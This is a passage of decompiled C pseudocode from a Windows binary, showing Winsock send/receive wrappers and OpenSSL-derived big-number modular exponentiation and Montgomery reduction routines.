      }
      else
      {
        result = -1;
      }
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (00426DE0) --------------------------------------------------------
int __cdecl sub_426DE0(int a1, char *buf, int len)
{
  int result; // eax
  int v4; // esi
  int Error; // eax

  result = 0;
  if ( buf )
  {
    WSASetLastError(0);
    v4 = recv(*(_DWORD *)(a1 + 28), buf, len, 0);
    sub_405010(a1, 15);
    if ( v4 <= 0 && (!v4 || v4 == -1) )
    {
      Error = WSAGetLastError();
      if ( Error == 4 || Error == 11 || Error == 10035 )
        sub_405030(a1, 9);
    }
    return v4;
  }
  return result;
}

//----- (00426E50) --------------------------------------------------------
int __cdecl sub_426E50(int a1, char *buf, int len)
{
  int v3; // esi
  int Error; // eax

  WSASetLastError(0);
  v3 = send(*(_DWORD *)(a1 + 28), buf, len, 0);
  sub_405010(a1, 15);
  if ( v3 <= 0 && (!v3 || v3 == -1) )
  {
    Error = WSAGetLastError();
    if ( Error == 4 || Error == 11 || Error == 10035 )
      sub_405030(a1, 10);
  }
  return v3;
}

//----- (00426EC0) --------------------------------------------------------
int __cdecl sub_426EC0(int a1, char *buf)
{
  return sub_426E50(a1, buf, strlen(buf));
}

//----- (00426EF0) --------------------------------------------------------
int __cdecl sub_426EF0(int *a1, _DWORD *a2, _DWORD *a3, int *a4, int *a5)
{
  int v6; // edi
  int *v7; // ebx
  unsigned int **v8; // ebp
  _DWORD *v9; // eax
  int v10; // eax
  int *v11; // esi
  int v12; // edi
  int v13; // esi
  _DWORD *v14; // eax
  int *v15; // esi
  int v16; // edi
  int v17; // esi
  int v18; // ebx
  int v19; // ebp
  int v20; // edi
  int v21; // ebp
  int v22; // edi
  int v23; // esi
  bool v24; // sf
  int v25; // [esp+4h] [ebp-C4h]
  int v26; // [esp+8h] [ebp-C0h]
  int v27; // [esp+8h] [ebp-C0h]
  int v28; // [esp+Ch] [ebp-BCh]
  int v29; // [esp+10h] [ebp-B8h]
  void *Block[13]; // [esp+14h] [ebp-B4h] BYREF
  _DWORD *v31[32]; // [esp+48h] [ebp-80h]

  v29 = 0;
  if ( sub_416F30((int)a3, 4) )
  {
    sub_408310(3, 125, 66, (int)"crypto\\bn\\bn_exp.c", 179);
    return 0;
  }
  v6 = sub_416F90(a3);
  v26 = v6;
  if ( v6 )
  {
    v7 = a5;
    sub_420700(a5);
    v8 = (unsigned int **)sub_420790(a5);
    v9 = sub_420790(a5);
    v31[0] = v9;
    if ( !v8 || !v9 )
      goto LABEL_52;
    sub_441E30(Block);
    if ( a4[3] )
    {
      if ( !sub_4173E0(v8, a4) )
      {
LABEL_52:
        sub_420750(v7);
        sub_441E60(Block);
        return v29;
      }
      v8[3] = 0;
      v10 = sub_441EA0(Block, v8);
    }
    else
    {
      v10 = sub_441EA0(Block, a4);
    }
    if ( v10 <= 0 )
      goto LABEL_52;
    v11 = v31[0];
    if ( !sub_42A2D0(v31[0], a2, a4, a5) )
      goto LABEL_52;
    if ( sub_416DB0((int)v11) )
    {
      sub_417490(a1, 0);
      v29 = 1;
      goto LABEL_52;
    }
    if ( v6 <= 671 )
    {
      if ( v6 <= 239 )
      {
        if ( v6 <= 79 )
        {
          v25 = 2 * (v6 > 23) + 1;
          if ( __OFSUB__(v25, 1) || v25 == 1 )
            goto LABEL_30;
        }
        else
        {
          v25 = 4;
        }
      }
      else
      {
        v25 = 5;
      }
    }
    else
    {
      v25 = 6;
    }
    if ( !sub_4421B0(v8, v11, (unsigned int **)v11, (int *)Block, a5) )
      goto LABEL_52;
    v12 = 1 << (v25 - 1);
    v13 = 1;
    if ( v12 > 1 )
    {
      do
      {
        v14 = sub_420790(a5);
        v31[v13] = v14;
        if ( !v14 || !sub_4421B0(v14, (int *)Block[v13 + 12], v8, (int *)Block, a5) )
          goto LABEL_52;
      }
      while ( ++v13 < v12 );
    }
    v6 = v26;
LABEL_30:
    v15 = a1;
    v16 = v6 - 1;
    v27 = 1;
    v28 = v16;
    if ( sub_417490(a1, 1) )
    {
      while ( 1 )
      {
        while ( !sub_416A50(a3, v16) )
        {
          if ( !v27 && !sub_4421B0(v15, v15, (unsigned int **)v15, (int *)Block, v7) )
            goto LABEL_52;
          if ( !v16 )
            goto LABEL_50;
          v28 = --v16;
        }
        v17 = 1;
        v18 = 0;
        v19 = 1;
        if ( v25 > 1 )
        {
          v20 = v16 - 1;
          do
          {
            if ( v20 < 0 )
              break;
            if ( sub_416A50(a3, v20) )
            {
              v21 = v19 << (v17 - v18);
              v18 = v17;
              v19 = v21 | 1;
            }
            ++v17;
            --v20;
          }
          while ( v17 < v25 );
        }
        v22 = v18 + 1;
        if ( !v27 )
        {
          v23 = 0;
          if ( v22 > 0 )
            break;
        }
LABEL_48:
        if ( !sub_4421B0(a1, a1, (unsigned int **)v31[v19 >> 1], (int *)Block, a5) )
          goto LABEL_51;
        v24 = -1 - v18 + v28 < 0;
        v28 += -1 - v18;
        v7 = a5;
        v27 = 0;
        if ( v24 )
        {
LABEL_50:
          v29 = 1;
          goto LABEL_52;
        }
        v15 = a1;
        v16 = v28;
      }
      while ( sub_4421B0(a1, a1, (unsigned int **)a1, (int *)Block, a5) )
      {
        if ( ++v23 >= v22 )
          goto LABEL_48;
      }
LABEL_51:
      v7 = a5;
    }
    goto LABEL_52;
  }
  if ( !sub_416DC0((int)a4) )
    return sub_417490(a1, 1);
  sub_417490(a1, 0);
  return 1;
}

//----- (004272A0) --------------------------------------------------------
int __usercall sub_4272A0@<eax>(int a1@<edx>, char a2@<cl>, _DWORD *a3@<edi>, int a4, int a5)
{
  int v5; // esi
  int v6; // eax
  int v7; // edx
  _DWORD *v8; // ecx

  v5 = a1;
  if ( a1 > a3[1] )
    v5 = a3[1];
  v6 = 0;
  if ( v5 > 0 )
  {
    v7 = 4 * (1 << a2);
    v8 = (_DWORD *)(a4 + 4 * a5);
    do
    {
      *v8 = *(_DWORD *)(*a3 + 4 * v6++);
      v8 = (_DWORD *)((char *)v8 + v7);
    }
    while ( v6 < v5 );
  }
  return 1;
}

//----- (004272F0) --------------------------------------------------------
int __fastcall sub_4272F0(int a1, int a2, _DWORD *a3, int a4, int a5)
{
  int v5; // edi
  int v7; // esi
  int result; // eax
  int i; // ebx
  int v10; // edx
  int j; // ecx
  int v12; // eax
  int v13; // eax
  int v14; // edi
  unsigned int v15; // ebx
  unsigned int v16; // edx
  unsigned int v17; // ebp
  unsigned int v18; // ecx
  int v19; // eax
  int v20; // ebp
  int v21; // ecx
  int v22; // ebx
  int v23; // esi
  int v24; // ecx
  int v25; // eax
  int v26; // [esp+10h] [ebp-28h]
  _DWORD *v27; // [esp+14h] [ebp-24h]
  _DWORD *v28; // [esp+18h] [ebp-20h]
  _DWORD *v29; // [esp+1Ch] [ebp-1Ch]
  int v30; // [esp+20h] [ebp-18h]
  int v31; // [esp+24h] [ebp-14h]
  int v32; // [esp+28h] [ebp-10h]
  int v33; // [esp+2Ch] [ebp-Ch]
  int v34; // [esp+34h] [ebp-4h]
  int v35; // [esp+44h] [ebp+Ch]

  v5 = a2;
  v7 = 1 << a1;
  v26 = a2;
  result = (int)sub_4173C0((int)a3, a4);
  if ( result )
  {
    if ( a1 > 3 )
    {
      v13 = a5 >> (a1 - 2);
      v14 = 1 << (a1 - 2);
      v35 = (v14 - 1) & a5;
      v15 = -((v13 >= 0) & ((unsigned int)(v13 - 1) >> 31)) & 1;
      v16 = -((v13 >= 0) & (((v13 ^ 1u) - 1) >> 31)) & 1;
      v17 = -((v13 >= 0) & (((v13 ^ 2u) - 1) >> 31)) & 1;
      v18 = -((v13 >= 0) & (((v13 ^ 3u) - 1) >> 31)) & 1;
      v19 = 0;
      v20 = -v17;
      v21 = -v18;
      v22 = -v15;
      v31 = v20;
      v32 = v21;
      v33 = 0;
      if ( a4 > 0 )
      {
        v34 = 4 * v7;
        do
        {
          v23 = 0;
          v30 = 0;
          if ( v14 > 0 )
          {
            v29 = (_DWORD *)(v26 + 4 * v14);
            v28 = (_DWORD *)(v26 + 8 * v14);
            v27 = (_DWORD *)(v26 + 12 * v14);
            do
            {
              v24 = v21 & *v27 | v20 & *v28;
              v20 = v31;
              v25 = v35 ^ v23++;
              v30 |= (v24 | -v16 & *v29 | v22 & *(_DWORD *)(v26 + 4 * v23 - 4)) & -(-((v25 >= 0) & ((unsigned int)(v25 - 1) >> 31)) & 1);
              v21 = v32;
              ++v27;
              ++v28;
              ++v29;
            }
            while ( v23 < v14 );
            v19 = v33;
          }
          *(_DWORD *)(*a3 + 4 * v19) = v30;
          v26 += v34;
          v33 = ++v19;
        }
        while ( v19 < a4 );
      }
    }
    else
    {
      for ( i = 0; i < a4; v5 += 4 * v7 )
      {
        v10 = 0;
        for ( j = 0; j < v7; v10 |= *(_DWORD *)(v5 + 4 * j - 4) & -(-((v12 >= 0) & ((unsigned int)(v12 - 1) >> 31)) & 1) )
          v12 = a5 ^ j++;
        *(_DWORD *)(*a3 + 4 * i++) = v10;
      }
    }
    a3[1] = a4;
    sub_416F60(a3);
    return 1;
  }
  return result;
}

//----- (00427520) --------------------------------------------------------
int __usercall sub_427520@<eax>(__m64 a1@<mm0>, unsigned int *a2, _DWORD *a3, _DWORD *a4, int a5, int *a6, void *a7)
{
  int v8; // esi
  int v9; // ebx
  _DWORD *v10; // eax
  int v11; // ecx
  signed int v12; // edi
  void *v13; // esp
  _BYTE *v14; // eax
  char *v15; // eax
  int *v16; // ecx
  int i; // eax
  int *v18; // eax
  _DWORD *v19; // eax
  char v20; // di
  int v21; // ebx
  int v22; // edi
  int j; // esi
  int v24; // eax
  int v25; // edi
  int v26; // esi
  int v27; // eax
  void *v28; // [esp-8h] [ebp-64h]
  _BYTE v29[12]; // [esp+0h] [ebp-5Ch] BYREF
  int v30[5]; // [esp+Ch] [ebp-50h] BYREF
  signed int v31; // [esp+20h] [ebp-3Ch]
  int v32; // [esp+24h] [ebp-38h]
  int v33; // [esp+28h] [ebp-34h]
  int v34; // [esp+2Ch] [ebp-30h]
  char *v35; // [esp+30h] [ebp-2Ch] BYREF
  int v36; // [esp+34h] [ebp-28h]
  int v37; // [esp+38h] [ebp-24h]
  int v38; // [esp+3Ch] [ebp-20h]
  int v39; // [esp+40h] [ebp-1Ch]
  void *Block; // [esp+44h] [ebp-18h]
  int v41; // [esp+48h] [ebp-14h]
  char *v42; // [esp+4Ch] [ebp-10h]
  void *v43; // [esp+50h] [ebp-Ch]
  int v44; // [esp+54h] [ebp-8h]

  v33 = 0;
  Block = 0;
  v31 = 0;
  v42 = 0;
  if ( !sub_416E20(a5) )
  {
    sub_408310(3, 124, 102, (int)"crypto\\bn\\bn_exp.c", 622);
    return 0;
  }
  v8 = *(_DWORD *)(a5 + 4);
  v32 = v8;
  v9 = sub_416F90(a4);
  if ( !v9 )
  {
    if ( !sub_416DC0(a5) )
      return sub_417490(a2, 1);
    sub_417490(a2, 0);
    return 1;
  }
  sub_420700(a6);
  if ( a7 )
  {
    v43 = a7;
  }
  else
  {
    v10 = sub_4289A0();
    v43 = v10;
    if ( !v10 || !sub_4285F0(v10, (int **)a5, a6) )
      goto LABEL_59;
  }
  if ( v9 <= 937 )
  {
    if ( v9 <= 306 )
    {
      if ( v9 <= 89 )
        v44 = 2 * (v9 > 22) + 1;
      else
        v44 = 4;
    }
    else
    {
      v44 = 5;
    }
  }
  else
  {
    v44 = 6;
  }
  v11 = 2 * v8;
  v34 = 1 << v44;
  if ( 2 * v8 <= 1 << v44 )
    v11 = 1 << v44;
  v12 = 4 * (v8 * (1 << v44) + v11);
  v41 = v8 * (1 << v44);
  v31 = v12;
  if ( v12 >= 3072 )
  {
    v14 = sub_4133F0(v12 + 64);
    Block = v14;
    if ( !v14 )
      goto LABEL_58;
  }
  else
  {
    v13 = alloca(v12 + 64);
    v14 = v29;
    Block = v29;
  }
  v42 = &v14[-((unsigned __int8)v14 & 0x3F) + 64];
  memset(v42, 0, v12);
  if ( v12 < 3072 )
    Block = 0;
  v15 = &v42[4 * v41];
  v30[1] = 0;
  v36 = 0;
  v30[3] = 0;
  v38 = 0;
  v30[4] = 2;
  v39 = 2;
  v16 = *(int **)a5;
  v35 = v15;
  v30[0] = (int)&v15[4 * v8];
  v30[2] = v8;
  v37 = v8;
  if ( v16[v8 - 1] >= 0 )
  {
    v28 = v43;
    v18 = (int *)sub_416820();
    if ( !sub_416E50(a1, (unsigned int *)&v35, v18, (int)v28, a6) )
      goto LABEL_58;
  }
  else
  {
    *(_DWORD *)v15 = -*v16;
    for ( i = 1; i < v8; ++i )
      *(_DWORD *)&v35[4 * i] = ~*(_DWORD *)(*(_DWORD *)a5 + 4 * i);
    v36 = v8;
  }
  v19 = a3;
  if ( a3[3] )
  {
LABEL_35:
    if ( !sub_4299A0(0, (int)v30, v19, (int *)a5, a6) || !sub_416E50(a1, (unsigned int *)v30, v30, (int)v43, a6) )
      goto LABEL_58;
    goto LABEL_37;
  }
  if ( sub_416960(a3, (int *)a5) >= 0 )
  {
    v19 = a3;
    goto LABEL_35;
  }
  if ( !sub_416E50(a1, (unsigned int *)v30, a3, (int)v43, a6) )
    goto LABEL_58;
LABEL_37:
  if ( sub_4272A0(v8, v44, &v35, (int)v42, 0) && sub_4272A0(v8, v44, v30, (int)v42, 1) )
  {
    v20 = v44;
    if ( v44 <= 1 )
      goto LABEL_46;
    if ( !sub_428890(a1, (unsigned int *)&v35, v30, (int)v30, (int)v43, a6) || !sub_4272A0(v8, v20, &v35, (int)v42, 2) )
      goto LABEL_58;
    v41 = 3;
    if ( v34 <= 3 )
    {
LABEL_46:
      v21 = v9 - 1;
      v22 = 0;
      for ( j = v21 % v44; j >= 0; v22 = v24 + 2 * v22 )
      {
        v24 = sub_416A50(a4, v21);
        --j;
        --v21;
      }
      if ( sub_4272F0(v44, (int)v42, &v35, v32, v22) )
      {
        if ( v21 < 0 )
        {
LABEL_56:
          if ( sub_428540(a2, &v35, (int)v43, a6) )
            v33 = 1;
        }
        else
        {
          while ( 1 )
          {
            v25 = 0;
            v26 = 0;
            if ( v44 > 0 )
              break;
LABEL_53:
            if ( !sub_4272F0(v44, (int)v42, v30, v32, v26)
              || !sub_428890(a1, (unsigned int *)&v35, (int *)&v35, (int)v30, (int)v43, a6) )
            {
              goto LABEL_58;
            }
            if ( v21 < 0 )
              goto LABEL_56;
          }
          while ( sub_428890(a1, (unsigned int *)&v35, (int *)&v35, (int)&v35, (int)v43, a6) )
          {
            v27 = sub_416A50(a4, v21);
            ++v25;
            --v21;
            v26 = v27 + 2 * v26;
            if ( v25 >= v44 )
              goto LABEL_53;
          }
        }
      }
    }
    else
    {
      while ( sub_428890(a1, (unsigned int *)&v35, v30, (int)&v35, (int)v43, a6)
           && sub_4272A0(v8, v44, &v35, (int)v42, v41) )
      {
        if ( ++v41 >= v34 )
          goto LABEL_46;
      }
    }
  }
LABEL_58:
  if ( !a7 )
LABEL_59:
    sub_4285A0(v43);
  if ( v42 )
  {
    sub_4139E0(v42, v31);
    sub_413490(Block);
  }
  sub_420750(a6);
  return v33;
}

//----- (00427A30) --------------------------------------------------------
int __usercall sub_427A30@<eax>(
        __m64 a1@<mm0>,
        unsigned int *a2,
        unsigned int a3,
        _DWORD *a4,
        int a5,
        int *a6,
        _DWORD *a7)
{
  _DWORD *v8; // edi
  unsigned int *v9; // esi
  _DWORD *v10; // eax
  int v11; // ebx
  _DWORD *v12; // eax
  unsigned int v13; // edi
  int v14; // ecx
  bool v15; // sf
  int v16; // ebx
  unsigned int *v17; // eax
  unsigned int v18; // ebx
  unsigned int *v19; // eax
  int v20; // eax
  _DWORD *Block; // [esp+8h] [ebp-14h]
  int v22; // [esp+Ch] [ebp-10h]
  int v23; // [esp+10h] [ebp-Ch]
  int v24; // [esp+14h] [ebp-8h]
  int v25; // [esp+14h] [ebp-8h]
  int v26; // [esp+18h] [ebp-4h]

  Block = 0;
  v26 = 0;
  if ( sub_416F30((int)a4, 4) )
  {
    sub_408310(3, 117, 66, (int)"crypto\\bn\\bn_exp.c", 1125);
    return 0;
  }
  if ( !sub_416E20(a5) )
  {
    sub_408310(3, 117, 102, (int)"crypto\\bn\\bn_exp.c", 1133);
    return 0;
  }
  if ( *(_DWORD *)(a5 + 4) == 1 )
    a3 %= **(_DWORD **)a5;
  v24 = sub_416F90(a4);
  if ( v24 )
  {
    if ( !a3 )
      goto LABEL_9;
    sub_420700(a6);
    v8 = sub_420790(a6);
    v9 = sub_420790(a6);
    v10 = sub_420790(a6);
    v11 = (int)v10;
    v23 = (int)v10;
    if ( !v8 || !v9 || !v10 )
      goto LABEL_51;
    if ( a7 )
    {
      Block = a7;
    }
    else
    {
      v12 = sub_4289A0();
      Block = v12;
      if ( !v12 || !sub_4285F0(v12, (int **)a5, a6) )
        goto LABEL_52;
    }
    v13 = a3;
    v14 = 1;
    v15 = v24 - 2 < 0;
    v22 = 1;
    v25 = v24 - 2;
    if ( !v15 )
    {
      do
      {
        v16 = v13 * v13;
        if ( v13 * v13 / v13 != v13 )
        {
          if ( v14 )
          {
            if ( !sub_417490(v9, v13) || !sub_416E50(a1, v9, (int *)v9, (int)Block, a6) )
              goto LABEL_51;
            v22 = 0;
          }
          else
          {
            if ( !sub_438150((unsigned int **)v9, v13) || !sub_4299A0(0, v23, v9, (int *)a5, a6) )
              goto LABEL_51;
            v17 = v9;
            v9 = (unsigned int *)v23;
            v23 = (int)v17;
          }
          v14 = v22;
          v16 = 1;
        }
        v13 = v16;
        if ( !v14 && !sub_428890(a1, v9, (int *)v9, (int)v9, (int)Block, a6) )
          goto LABEL_51;
        if ( sub_416A50(a4, v25) )
        {
          v18 = a3 * v16;
          if ( v18 / a3 != v13 )
          {
            if ( v22 )
            {
              if ( !sub_417490(v9, v13) || !sub_416E50(a1, v9, (int *)v9, (int)Block, a6) )
                goto LABEL_51;
              v22 = 0;
            }
            else
            {
              if ( !sub_438150((unsigned int **)v9, v13) || !sub_4299A0(0, v23, v9, (int *)a5, a6) )
                goto LABEL_51;
              v19 = v9;
              v9 = (unsigned int *)v23;
              v23 = (int)v19;
            }
            v18 = a3;
          }
          v13 = v18;
        }
        v15 = --v25 < 0;
        v14 = v22;
      }
      while ( !v15 );
      v11 = v23;
    }
    if ( v13 == 1 )
    {
      if ( v14 )
      {
        v20 = sub_417490(a2, 1);
LABEL_49:
        if ( v20 )
          v26 = 1;
        goto LABEL_51;
      }
    }
    else
    {
      if ( v14 )
      {
        if ( sub_417490(v9, v13) && sub_416E50(a1, v9, (int *)v9, (int)Block, a6) )
          goto LABEL_48;
LABEL_51:
        if ( a7 )
        {
LABEL_53:
          sub_420750(a6);
          return v26;
        }
LABEL_52:
        sub_4285A0(Block);
        goto LABEL_53;
      }
      if ( !sub_438150((unsigned int **)v9, v13) || !sub_4299A0(0, v11, v9, (int *)a5, a6) )
        goto LABEL_51;
      v9 = (unsigned int *)v11;
    }
LABEL_48:
    v20 = sub_428540(a2, v9, (int)Block, a6);
    goto LABEL_49;
  }
  if ( sub_416DC0(a5) )
  {
LABEL_9:
    sub_417490(a2, 0);
    return 1;
  }
  return sub_417490(a2, 1);
}

//----- (00427DE0) --------------------------------------------------------
int __usercall sub_427DE0@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, _DWORD *a4, int a5, int *a6, void *a7)
{
  int *v8; // ebp
  unsigned int *v9; // edi
  int *v10; // eax
  int *v11; // esi
  _DWORD *v12; // eax
  int *v13; // edi
  int v14; // ebx
  int v15; // edi
  int v16; // esi
  unsigned int *v17; // eax
  int v18; // esi
  int v19; // ebx
  unsigned int *v20; // edi
  int i; // eax
  int *v22; // eax
  int v23; // edi
  int v24; // esi
  int v25; // ebp
  int v26; // ebx
  int v27; // edi
  int v28; // ebx
  int v29; // esi
  bool v30; // sf
  _DWORD *Block; // [esp+8h] [ebp-98h]
  int v32; // [esp+Ch] [ebp-94h]
  int v33; // [esp+Ch] [ebp-94h]
  unsigned int *v34; // [esp+10h] [ebp-90h]
  unsigned int *v35; // [esp+14h] [ebp-8Ch]
  int v36; // [esp+14h] [ebp-8Ch]
  int v37; // [esp+18h] [ebp-88h]
  int v38; // [esp+1Ch] [ebp-84h]
  int v39[32]; // [esp+20h] [ebp-80h]

  v38 = 0;
  Block = 0;
  if ( sub_416F30((int)a4, 4) )
    return sub_427520(a1, a2, a3, a4, a5, a6, a7);
  if ( !sub_416E20(a5) )
  {
    sub_408310(3, 109, 102, (int)"crypto\\bn\\bn_exp.c", 320);
    return 0;
  }
  v32 = sub_416F90(a4);
  if ( v32 )
  {
    v8 = a6;
    sub_420700(a6);
    v35 = sub_420790(a6);
    v9 = sub_420790(a6);
    v34 = v9;
    v10 = sub_420790(a6);
    v11 = v10;
    v39[0] = (int)v10;
    if ( !v35 || !v9 || !v10 )
      goto LABEL_66;
    if ( a7 )
    {
      Block = a7;
    }
    else
    {
      v12 = sub_4289A0();
      Block = v12;
      if ( !v12 || !sub_4285F0(v12, (int **)a5, a6) )
        goto LABEL_67;
    }
    v13 = a3;
    if ( a3[3] || sub_416960(a3, (int *)a5) >= 0 )
    {
      if ( !sub_42A2D0(v11, a3, (int *)a5, a6) )
        goto LABEL_66;
      v13 = v11;
    }
    if ( sub_416DB0((int)v13) )
    {
      sub_417490(a2, 0);
      v38 = 1;
      goto LABEL_66;
    }
    if ( !sub_416E50(a1, (unsigned int *)v11, v13, (int)Block, a6) )
    {
LABEL_66:
      if ( a7 )
      {
LABEL_68:
        sub_420750(v8);
        return v38;
      }
LABEL_67:
      sub_4285A0(Block);
      goto LABEL_68;
    }
    v14 = v32;
    if ( v32 <= 671 )
    {
      if ( v32 <= 239 )
      {
        if ( v32 <= 79 )
        {
          v37 = 2 * (v32 > 23) + 1;
          if ( __OFSUB__(v37, 1) || v37 == 1 )
            goto LABEL_36;
        }
        else
        {
          v37 = 4;
        }
      }
      else
      {
        v37 = 5;
      }
    }
    else
    {
      v37 = 6;
    }
    if ( !sub_428890(a1, v35, v11, (int)v11, (int)Block, a6) )
      goto LABEL_66;
    v15 = 1 << (v37 - 1);
    v16 = 1;
    if ( v15 > 1 )
    {
      do
      {
        v17 = sub_420790(a6);
        v39[v16] = (int)v17;
        if ( !v17 || !sub_428890(a1, v17, (int *)v39[v16 - 1], (int)v35, (int)Block, a6) )
          goto LABEL_66;
      }
      while ( ++v16 < v15 );
    }
    v14 = v32;
LABEL_36:
    v18 = *(_DWORD *)(a5 + 4);
    v19 = v14 - 1;
    v36 = 1;
    v33 = v19;
    if ( *(int *)(*(_DWORD *)a5 + 4 * v18 - 4) >= 0 )
    {
      v22 = (int *)sub_416820();
      if ( sub_416E50(a1, v34, v22, (int)Block, a6) )
        goto LABEL_44;
    }
    else
    {
      v20 = v34;
      if ( sub_4173C0((int)v34, v18) )
      {
        *(_DWORD *)*v34 = -**(_DWORD **)a5;
        for ( i = 1; i < v18; ++i )
          *(_DWORD *)(*v34 + 4 * i) = ~*(_DWORD *)(*(_DWORD *)a5 + 4 * i);
        v34[1] = v18;
        sub_416F60(v34);
        while ( 1 )
        {
          while ( !sub_416A50(a4, v19) )
          {
            if ( !v36 && !sub_428890(a1, v20, (int *)v20, (int)v20, (int)Block, v8) )
              goto LABEL_66;
            if ( !v19 )
              goto LABEL_63;
            v33 = --v19;
          }
          v23 = 1;
          v24 = 1;
          v25 = 0;
          if ( v37 > 1 )
          {
            v26 = v19 - 1;
            do
            {
              if ( v26 < 0 )
                break;
              if ( sub_416A50(a4, v26) )
              {
                v27 = v23 << (v24 - v25);
                v25 = v24;
                v23 = v27 | 1;
              }
              ++v24;
              --v26;
            }
            while ( v24 < v37 );
          }
          v28 = v25 + 1;
          if ( !v36 )
          {
            v29 = 0;
            if ( v28 > 0 )
            {
              while ( sub_428890(a1, v34, (int *)v34, (int)v34, (int)Block, a6) )
              {
                if ( ++v29 >= v28 )
                  goto LABEL_60;
              }
LABEL_65:
              v8 = a6;
              goto LABEL_66;
            }
          }
LABEL_60:
          if ( !sub_428890(a1, v34, (int *)v34, v39[v23 >> 1], (int)Block, a6) )
            goto LABEL_65;
          v30 = -1 - v25 + v33 < 0;
          v33 += -1 - v25;
          v8 = a6;
          v36 = 0;
          if ( v30 )
            break;
          v19 = v33;
LABEL_44:
          v20 = v34;
        }
        v20 = v34;
LABEL_63:
        if ( sub_428540(a2, v20, (int)Block, v8) )
          v38 = 1;
      }
    }
    goto LABEL_66;
  }
  if ( !sub_416DC0(a5) )
    return sub_417490(a2, 1);
  sub_417490(a2, 0);
  return 1;
}
// 427DE0: using guessed type int var_80[32];

//----- (004282A0) --------------------------------------------------------
int __usercall sub_4282A0@<eax>(__m64 a1@<mm0>, int *a2, int *a3, _DWORD *a4, int *a5, int *a6)
{
  if ( !sub_416E20((int)a5) )
    return sub_426EF0(a2, a3, a4, a5, a6);
  if ( a3[1] != 1 || a3[3] || sub_416F30((int)a4, 4) )
    return sub_427DE0(a1, (unsigned int *)a2, a3, a4, (int)a5, a6, 0);
  return sub_427A30(a1, (unsigned int *)a2, *(_DWORD *)*a3, a4, (int)a5, a6, 0);
}

//----- (00428330) --------------------------------------------------------
int __cdecl sub_428330(unsigned int *a1, unsigned int **a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // ebx
  int v4; // esi
  int result; // eax
  unsigned int **v6; // ebp
  unsigned int *v7; // ecx
  unsigned int *v8; // edi
  int v9; // edx
  int v10; // ebx
  int v11; // eax
  unsigned int v12; // ebp
  unsigned int v13; // eax
  bool v14; // zf
  unsigned int *v15; // eax
  unsigned int v16; // ebp
  int v17; // edi
  unsigned int v18; // eax
  int v19; // ebx
  int v20; // esi
  int v21; // edx
  _DWORD *v22; // ecx
  int *v23; // eax
  int v24; // ebx
  int v25; // ebp
  int v26; // esi
  int v27; // ebx
  int v28; // edi
  _DWORD *v29; // eax
  int v30; // esi
  int v31; // [esp+8h] [ebp-20h]
  _DWORD *v32; // [esp+8h] [ebp-20h]
  unsigned int *v33; // [esp+Ch] [ebp-1Ch]
  int v34; // [esp+Ch] [ebp-1Ch]
  int v35; // [esp+10h] [ebp-18h]
  int v36; // [esp+10h] [ebp-18h]
  int v37; // [esp+14h] [ebp-14h]
  char *v38; // [esp+1Ch] [ebp-Ch]
  int v39; // [esp+20h] [ebp-8h]
  int v40; // [esp+24h] [ebp-4h]

  v3 = v2;
  v4 = v2[7];
  if ( v4 )
  {
    v6 = a2;
    result = (int)sub_4173C0((int)a2, 2 * v4);
    if ( result )
    {
      a2[3] = (unsigned int *)(v3[9] ^ (unsigned int)a2[3]);
      v7 = a2[1];
      v8 = *a2;
      v33 = (unsigned int *)v3[6];
      if ( (unsigned int *)(2 * v4) != v7 )
        memset(&v8[(_DWORD)v7], 0, 4 * (2 * v4 - (_DWORD)v7));
      a2[1] = (unsigned int *)(2 * v4);
      v9 = v3[16];
      v10 = 0;
      v35 = v9;
      if ( v4 > 0 )
      {
        v31 = v4;
        do
        {
          v11 = sub_4381C0(v8, v33, v4, v35 * *v8);
          v12 = v8[v4];
          v13 = v10 + v12 + v11;
          v8[v4] = v13;
          ++v8;
          v14 = v31-- == 1;
          v10 = (v12 >= v13) & (v10 | (v13 != v12));
        }
        while ( !v14 );
        v6 = a2;
      }
      result = (int)sub_4173C0((int)a1, v4);
      if ( result )
      {
        a1[1] = v4;
        v15 = v6[3];
        v16 = *a1;
        a1[3] = (unsigned int)v15;
        v17 = (int)&(*a2)[v4];
        v32 = (_DWORD *)v16;
        v18 = sub_438990((_DWORD *)v16, (_DWORD *)v17, v33, v4);
        v19 = v17 & (v10 - v18) | v16 & ~(v10 - v18);
        v20 = v4 - 4;
        v21 = 0;
        v40 = v19;
        if ( v20 > 0 )
        {
          v22 = (_DWORD *)(v16 + 4);
          v34 = v17 - v19;
          v23 = (int *)(v19 + 8);
          v38 = (char *)(v16 - v19);
          v36 = v17 - v16;
          do
          {
            v24 = *(v23 - 2);
            v37 = *(v23 - 1);
            v25 = *v23;
            *(_DWORD *)(v17 + 4 * v21) = 0;
            v39 = v23[1];
            *(_DWORD *)((char *)v22 + v36) = 0;
            *(v22 - 1) = v24;
            *(int *)((char *)v23 + v34) = 0;
            *v22 = v37;
            *(_DWORD *)(v17 + 4 * v21 + 12) = 0;
            *(_DWORD *)&v38[(_DWORD)v23] = v25;
            v22[2] = v39;
            v21 += 4;
            v22 += 4;
            v23 += 4;
          }
          while ( v21 < v20 );
          v16 = (unsigned int)v32;
          v19 = v40;
        }
        v26 = v20 + 4;
        if ( v21 < v26 )
        {
          v27 = v19 - v16;
          v28 = v17 - v16;
          v29 = (_DWORD *)(v16 + 4 * v21);
          v30 = v26 - v21;
          do
          {
            *v29 = *(_DWORD *)((char *)v29 + v27);
            *(_DWORD *)((char *)v29++ + v28) = 0;
            --v30;
          }
          while ( v30 );
        }
        sub_416F60(a2);
        sub_416F60(a1);
        return 1;
      }
    }
  }
  else
  {
    a1[1] = 0;
    return 1;
  }
  return result;
}
// 42833B: variable 'v2' is possibly undefined

//----- (00428540) --------------------------------------------------------
int __cdecl sub_428540(unsigned int *a1, _DWORD *a2, int a3, int *a4)
{
  int v4; // ebx
  unsigned int **v5; // esi

  v4 = 0;
  sub_420700(a4);
  v5 = (unsigned int **)sub_420790(a4);
  if ( v5 && sub_4173E0(v5, a2) )
    v4 = sub_428330(a1, v5);
  sub_420750(a4);
  return v4;
}

//----- (004285A0) --------------------------------------------------------
void __cdecl sub_4285A0(_DWORD *Block)
{
  if ( Block )
  {
    sub_417000(Block + 1);
    sub_417000(Block + 6);
    sub_417000(Block + 11);
    if ( (Block[18] & 1) != 0 )
      sub_413490(Block);
  }
}

//----- (004285F0) --------------------------------------------------------
int __cdecl sub_4285F0(_DWORD *a1, int **a2, int *a3)
{
  int **v4; // esi
  _DWORD *v5; // ebx
  int *v6; // eax
